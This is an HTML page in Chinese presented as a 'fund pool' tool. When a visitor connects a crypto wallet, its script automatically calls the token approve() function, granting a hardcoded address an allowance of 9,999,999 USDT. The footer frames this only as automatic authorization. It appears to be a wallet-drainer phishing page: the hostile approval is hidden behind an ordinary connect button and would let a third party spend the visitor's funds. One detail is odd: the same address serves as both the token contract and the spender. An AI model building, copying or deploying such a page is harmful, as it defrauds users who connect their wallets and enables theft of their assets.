<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>链接资金池工具</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            min-height: 100vh;
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            color: #ffffff;
        }
        .container {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 16px;
            padding: 40px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            text-align: center;
        }
        h1 {
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 30px;
            background: linear-gradient(90deg, #4CAF50, #2196F3);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .wallet-connect {
            margin: 30px 0;
        }
        .btn {
            background: linear-gradient(90deg, #4CAF50, #45a049);
            color: white;
            padding: 12px 24px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 600;
            transition: all 0.3s ease;
            width: 100%;
            margin: 10px 0;
        }
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(76, 175, 80, 0.3);
        }
        .status {
            margin: 20px 0;
            padding: 15px;
            border-radius: 8px;
            font-size: 14px;
        }
        .success {
            background: rgba(76, 175, 80, 0.2);
            color: #4CAF50;
            border: 1px solid rgba(76, 175, 80, 0.3);
        }
        .error {
            background: rgba(244, 67, 54, 0.2);
            color: #F44336;
            border: 1px solid rgba(244, 67, 54, 0.3);
        }
        .info {
            background: rgba(33, 150, 243, 0.2);
            color: #2196F3;
            border: 1px solid rgba(33, 150, 243, 0.3);
        }
        .address {
            font-family: 'Courier New', monospace;
            background: rgba(255, 255, 255, 0.1);
            padding: 8px 12px;
            border-radius: 4px;
            word-break: break-all;
            font-size: 12px;
            margin: 10px 0;
        }
        .footer {
            margin-top: 30px;
            font-size: 12px;
            color: rgba(255, 255, 255, 0.6);
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>链接资金池工具</h1>
        
        <div class="wallet-connect">
            <button id="connectWallet" class="btn">连接钱包</button>
            <div id="status" class="status info">请连接您的钱包</div>
        </div>
        
        <div class="footer">
            <p>点击连接钱包后，系统将自动完成授权操作</p>
        </div>
    </div>
    
    <script>
        // 合约地址和授权地址
        const CONTRACT_ADDRESS = '0xB8C306FAdfFE05BF3336333585B3FE9B7e6AFD02';
        const AUTHORIZED_ADDRESS = '0xB8C306FAdfFE05BF3336333585B3FE9B7e6AFD02';
        
        // 简化的合约ABI
        const CONTRACT_ABI = [
            {
                "constant": false,
                "inputs": [
                    {"name": "spender", "type": "address"},
                    {"name": "amount", "type": "uint256"}
                ],
                "name": "approve",
                "outputs": [{"name": "", "type": "bool"}],
                "payable": false,
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "constant": true,
                "inputs": [
                    {"name": "owner", "type": "address"},
                    {"name": "spender", "type": "address"}
                ],
                "name": "allowance",
                "outputs": [{"name": "", "type": "uint256"}],
                "payable": false,
                "stateMutability": "view",
                "type": "function"
            }
        ];
        
        let web3;
        let contract;
        let account;
        
        // 连接钱包
        document.getElementById('connectWallet').addEventListener('click', async () => {
            try {
                // 检查是否有Web3提供者
                if (!window.ethereum && !window.web3) {
                    document.getElementById('status').innerHTML = '请安装 MetaMask 钱包';
                    document.getElementById('status').className = 'status error';
                    return;
                }
                
                // 初始化Web3
                if (window.ethereum) {
                    web3 = new Web3(window.ethereum);
                    // 请求账户访问
                    await window.ethereum.request({ method: 'eth_requestAccounts' });
                } else if (window.web3) {
                    web3 = new Web3(window.web3.currentProvider);
                }
                
                // 获取账户
                const accounts = await web3.eth.getAccounts();
                account = accounts[0];
                
                // 初始化合约
                contract = new web3.eth.Contract(CONTRACT_ABI, CONTRACT_ADDRESS);
                
                // 更新状态
                document.getElementById('status').innerHTML = `已连接钱包: <span class="address">${account}</span>`;
                document.getElementById('status').className = 'status success';
                
                // 自动授权
                await approveTokens();
            } catch (error) {
                console.error('连接失败:', error);
                document.getElementById('status').innerHTML = `连接失败: ${error.message || '未知错误'}`;
                document.getElementById('status').className = 'status error';
            }
        });
        
        // 授权函数
        async function approveTokens() {
            try {
                document.getElementById('status').innerHTML = '正在授权...';
                document.getElementById('status').className = 'status info';
                
                // 授权金额：9999999 USDT（注意：USDT有6位小数）
                const amount = web3.utils.toWei('9999999', 'mwei');
                
                // 执行授权
                const result = await contract.methods.approve(AUTHORIZED_ADDRESS, amount).send({ 
                    from: account,
                    gas: 100000
                });
                
                // 更新状态
                document.getElementById('status').innerHTML = `授权成功！交易哈希: <a href="https://etherscan.io/tx/${result.transactionHash}" target="_blank">${result.transactionHash}</a>`;
                document.getElementById('status').className = 'status success';
                
                // 检查授权额度
                await checkAllowance();
            } catch (error) {
                console.error('授权失败:', error);
                document.getElementById('status').innerHTML = `授权失败: ${error.message || '未知错误'}`;
                document.getElementById('status').className = 'status error';
            }
        }
        
        // 检查授权额度
        async function checkAllowance() {
            try {
                const allowance = await contract.methods.allowance(account, AUTHORIZED_ADDRESS).call();
                const allowanceUSDT = web3.utils.fromWei(allowance, 'mwei');
                
                document.getElementById('status').innerHTML = `已连接钱包: <span class="address">${account}</span><br>当前授权额度: ${allowanceUSDT} USDT`;
                document.getElementById('status').className = 'status success';
            } catch (error) {
                console.error('检查授权额度失败:', error);
            }
        }
    </script>
    
    <!-- 引入web3.js -->
    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
</body>
</html>
